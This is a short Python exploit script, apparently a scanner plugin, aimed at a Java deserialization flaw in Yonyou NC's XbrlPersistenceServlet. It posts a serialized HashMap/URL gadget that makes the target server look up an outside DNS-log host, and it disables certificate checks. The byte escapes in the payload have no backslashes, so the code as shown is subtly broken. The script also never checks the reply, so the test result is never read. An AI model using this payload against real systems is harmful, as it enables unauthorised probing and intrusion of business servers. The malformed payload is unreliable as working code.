import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from lib.Urldeal import umethod
from lib import *
import logging



def YongYou_fxlh(Url):
    scheme, url, port = umethod(Url)
    urldata = scheme + "://" + url + ':' + str(port) + '/'
    vuln_url = urldata + 'service/~xbrl/XbrlPersistenceServlet'
    try:
        dnslog = "x79x37x64x70" 
        data = "xacxedx00x05x73x72x00x11x6ax61x76x61x2ex75x74x69x6cx2ex48x61x73x68x4dx61x70x05x07xdaxc1xc3x16x60xd1x03x00x02x46x00x0ax6cx6fx61x64x46x61x63x74x6fx72x49x00x09x74x68x72x65x73x68x6fx6cx64x78x70x3fx40x00x00x00x00x00x0cx77x08x00x00x00x10x00x00x00x01x73x72x00x0cx6ax61x76x61x2ex6ex65x74x2ex55x52x4cx96x25x37x36x1axfcxe4x72x03x00x07x49x00x08x68x61x73x68x43x6fx64x65x49x00x04x70x6fx72x74x4cx00x09x61x75x74x68x6fx72x69x74x79x74x00x12x4cx6ax61x76x61x2fx6cx61x6ex67x2fx53x74x72x69x6ex67x3bx4cx00x04x66x69x6cx65x71x00x7ex00x03x4cx00x04x68x6fx73x74x71x00x7ex00x03x4cx00x08x70x72x6fx74x6fx63x6fx6cx71x00x7ex00x03x4cx00x03x72x65x66x71x00x7ex00x03x78x70xffxffxffxffx00x00x00x50x74x00x11"+dnslog+"x3ax38x30x74x00x00x74x00x0e"+dnslog+"x74x00x04x68x74x74x70x70x78x74x00x18x68x74x74x70x3ax2fx2f"+dnslog+"x3ax38x30x78"
        uploadHeader={"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"}
        req = requests.post(vuln_url, headers=uploadHeader, verify=False, data=data, timeout=25)
        # print (req.text)
            

    except:
        logging.error("YongYou_fxlh脚本出现异常")


